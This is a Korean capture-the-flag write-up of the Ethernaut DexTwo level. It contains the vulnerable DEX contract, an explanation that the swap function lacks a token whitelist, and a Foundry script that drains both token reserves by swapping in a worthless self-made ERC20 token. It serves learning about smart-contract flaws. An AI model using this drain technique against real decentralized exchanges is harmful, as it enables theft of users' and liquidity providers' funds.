# 지문

이 레벨에서는 이전 단계에서 봤던 Dex 컨트랙트를 약간 수정한 **DexTwo**를 다른 방식으로 깨뜨려야 합니다.

목표는 DexTwo 컨트랙트가 보유한 **token1과 token2의 잔고를 모두 고갈시키는 것**입니다.

여전히 시작 시점에 당신은 **token1 10개, token2 10개**를 가지고 있습니다.
DEX 컨트랙트는 여전히 각각 **100개씩**을 보유한 상태로 시작합니다.

---

도움이 될 만한 것들:

* `swap` 메서드가 어떻게 수정되었는지 확인해보세요.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

# 풀이 

문제를 푸는 기본 아이디어는 ERC20을 구현한 또 다른 컨트랙트를 하나 구현한다.

그 뒤에 내가 만든 ERC20 컨트랙트에서 문제 컨트랙트의 토큰 양을 100으로 맞춰놓는다.

이후, 내 지갑에서 문제컨트랙트 주소에 대해서 넉넉하게 1000 정도 approve해준다

From에 내가 구현한 ERC20 토큰의 주소를 to에 token1의 주소를 갖다놓고 amount를 100으로 맞춘다.

그럼 컨트랙트 내 잠들어있는 token1을 모두 drain할 수 있다.

token2도 동일하게 수행하면된다.

실제 상황에 대입해보자면 DEX 내에 컨트랙트에 있는 토큰은 가치가 있는 토큰이고 내가 공격자 입장에서 만든 토큰은 아무 가치가 없는 쓰레기 토큰일것이다.

현 상황은 문제 컨트랙트(valuable token) ↔ 공격자 컨트랙트(trash token) 이 된것이다.

swap할 수 있는 token을 화이트리스트로 관리하지않아서 발생하는 취약점이다.


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract AttackToken {
    string public name = "AttackToken";
    string public symbol = "ATK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 supply) {
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "no balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "no balance");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        balanceOf[from] -= amount;
        allowance[from][msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SolveScript is Script {
    address public target = 0x47bF974Cf85584549DCA303933dC37BDa2A47933;
    address public player = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    function run() public {
        vm.startBroadcast();

        IDexTwo dex = IDexTwo(target);
        address t1 = dex.token1();
        address t2 = dex.token2();

        logBalances(t1, t2);

        AttackToken atk = new AttackToken(4 ether);

        atk.transfer(target, 1 ether);
        atk.approve(target, type(uint256).max);

        // swap atk -> token1
        dex.swap(address(atk), t1, 1 ether);

        // swap atk -> token2
        dex.swap(address(atk), t2, 2 ether);
        logBalances(t1, t2);
        vm.stopBroadcast();
    }

    function logBalances(address t1, address t2) internal view {
        console.log("DEX token1:", IERC20(t1).balanceOf(target));
        console.log("DEX token2:", IERC20(t2).balanceOf(target));
        console.log("Player token1:", IERC20(t1).balanceOf(player));
        console.log("Player token2:", IERC20(t2).balanceOf(player));
    }
}
```